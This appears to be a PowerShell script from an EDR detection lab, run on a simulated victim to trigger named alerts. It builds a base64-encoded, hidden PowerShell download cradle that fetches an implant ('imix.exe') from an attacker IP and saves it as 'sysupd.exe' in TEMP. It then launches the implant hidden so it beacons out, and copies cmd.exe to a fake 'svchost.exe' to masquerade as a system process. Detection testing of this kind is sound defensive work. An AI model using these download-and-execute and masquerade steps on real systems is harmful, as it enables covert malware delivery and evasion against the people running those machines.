# VICTIM - Phase 3+4: deliver the implant from the simulated shell and launch it.
# Run from an elevated PowerShell. After each step, watch the EDR console live panel
# (http://127.0.0.1:8420) or run check-alerts.ps1.
param(
    [string]$Attacker = "172.16.69.109",
    [string]$Port = 8000
)

Write-Host "== 1. encoded-PowerShell download cradle (expect PROC-ENC-PS, EVT-4688-SUSP) =="
$cmd = "IWR http://${Attacker}:${Port}/imix.exe -OutFile `$env:TEMP\sysupd.exe"
$enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
Start-Process powershell -ArgumentList "-NoProfile","-EncodedCommand",$enc -WindowStyle Hidden
Start-Sleep 6

Write-Host "== 2. launch implant A from TEMP, keep alive (expect EVT-4688-TEMP, PROG-IMPLANT-LAUNCH, NET-BEACON) =="
if (Test-Path "$env:TEMP\sysupd.exe") {
    Start-Process "$env:TEMP\sysupd.exe" -WindowStyle Hidden
    Write-Host "   implant running; let it callback 2-3 min, then check NET-BEACON"
} else {
    Write-Warning "implant not delivered yet - check step 1 / attacker HTTP server"
}

Write-Host "== 3. fake-svchost masquerade (expect EVT-4688-TEMP; PROC-MASQ on name) =="
Copy-Item C:\Windows\System32\cmd.exe C:\Users\Public\svchost.exe -Force
Start-Process C:\Users\Public\svchost.exe -ArgumentList "/c","ping -n 25 127.0.0.1" -WindowStyle Hidden

Write-Host "done. run 02-persistence-tests.ps1 next (after killing the implant: Stop-Process -Name sysupd -Force)"
